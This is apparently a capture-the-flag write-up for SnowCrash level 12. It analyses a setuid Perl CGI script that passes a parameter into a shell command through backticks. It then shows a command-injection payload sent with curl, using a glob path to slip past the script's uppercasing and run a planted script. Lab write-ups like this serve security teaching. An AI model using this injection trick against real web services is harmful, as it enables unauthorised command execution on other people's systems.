# LEVEL 12

## Analysis

## Enumeration

In this challenge we have a perl script:
```bash
  $ ls -la
  [...]
  -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```
Containing:
```perl
  #!/usr/bin/env perl
  # localhost:4646
  use CGI qw{param};
  print "Content-type: text/html\n\n";

  sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
  }

  sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
  }

  n(t(param("x"), param("y")));
```
## Investigation

The script runs a web server on port 4646 and processes user input through CGI parameters. The key vulnerable function is:
```perl
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
```
User input from param("x") is stored in $xx, transformed using: uppercase conversion (tr/a-z/A-Z/) and whitespace truncation (s/\s.*//). However, the transformed value is still directly interpolated into a shell command executed via Perl backticks.

## Vulnerability

Perl backticks execute commands through `/bin/sh -c`, meaning the string is interpreted by a shell. Since `$xx` is inserted without sanitization, it becomes part of a shell command, enabling command injection.

## Exploitation

```bash
  level12@SnowCrash:/tmp$ vim SCRIPT
  level12@SnowCrash:/tmp$ chmod 777 SCRIPT
  level12@SnowCrash:/tmp$ cat SCRIPT
  #!/bin/sh
  getflag > /tmp/flag

  level12@SnowCrash:/tmp$ cd ..
  level12@SnowCrash:/$ curl localhost:4646?x='`/*/SCRIPT`'
  ..level12@SnowCrash:/$ cat /tmp/flag
  Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

